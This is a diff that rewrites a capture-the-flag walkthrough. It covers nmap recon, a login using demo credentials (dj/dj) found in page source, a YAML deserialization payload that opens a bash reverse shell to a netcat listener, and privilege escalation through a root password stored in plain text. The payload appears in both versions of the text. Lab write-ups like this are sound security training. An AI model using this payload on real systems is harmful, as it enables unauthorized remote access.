@@ -17,38 +17,50 @@ icon: user-hoodie
 ## Framework - MITRE ATT&CK
 
 * ✅ Reconnaissance\
-  Ran an NMAP scan on the IP and returned ssh and http standard ports open. After that I opened a browser and found a login page. Possible password found. dj / dj
+  An nmap scan showed SSH and HTTP open on the standard ports. The login page on port 80 had demo credentials (dj / dj) sitting in the page source.
 * ✅ Initial Access\
-  Used demo credentials
+  Logged in with the demo credentials.
 * ✅ Execution\
-  Used manipulated yaml file to access reverse shell
+  Abused a YAML import feature to get a reverse shell.
 * ✅ Persistence\
-  created a TTY shell
+  Upgraded to a stable TTY shell.
 * ✅ Lateral Movement\
-  looking at services running confirmed a python script running as root and cinatins root credentials
+  A service running as root turned out to hold root's password in plain text.
 * ✅ Privilege Escalation\
-  ran su root and escalated to root user
+  Reused that password with su to become root.
 * ✅ Actions on Objectives\
-  read root.txt inside /root directory
+  Read root.txt in /root.
 
 ***
 
 ## Reconnaissance
 
-I first ran nmap to find open ports. I found por 22 and 80. I then went to the website on port 80 through the browser and found demo credentials in the source code.
+I started with an nmap scan to find open ports and got back port 22 (SSH) and port 80 (HTTP). I opened the site on port 80 in the browser and, digging through the page source, found a set of demo credentials.
 
 ## Initial Access
 
-I used the demo credentials in the source code to access the account. they were username: dj and password: dj . Once inside I found a function to import a yaml file.
+I logged in with those demo credentials — username `dj`, password `dj`. Once inside, I found a feature that let me import a YAML file, which looked like a promising way to get code execution.
 
 ## Privilege Escalation
 
-I created a reverse listener on the host using nc -lvnp 4444 and created a manipulated yaml file with the command !!python/object/apply:os.system
-  - "bash -c 'bash -i >& /dev/tcp/HostIP/4444 0>&1'" inside. I got a shell which I transofrmed into a TTY shell and couuld read the user.txt file. I then searched around a bit for any evidence of a root password so I could escalate privilages and found a service running as root with a password in plain text. I was able to use this to become root and read the root.txt
+First I started a listener on my attack box:
+
+```bash
+nc -lvnp 4444
+```
+
+Then I built a malicious YAML file that abuses unsafe deserialization to fire a reverse shell back to that listener:
+
+```yaml
+!!python/object/apply:os.system
+  - "bash -c 'bash -i >& /dev/tcp/HostIP/4444 0>&1'"
+```
+
+Importing it gave me a shell, which I upgraded to a proper TTY so I could work comfortably and read the user flag. From there I went looking for a way to escalate, and found a service running as root with its password stored in plain text. I reused that password to become root and read root.txt.
 
 ## Actions on Objectives
 
-I was able to use this to become root and read the root.txt
+With root access I could read root.txt in /root.
 
 ## Tools Used
 
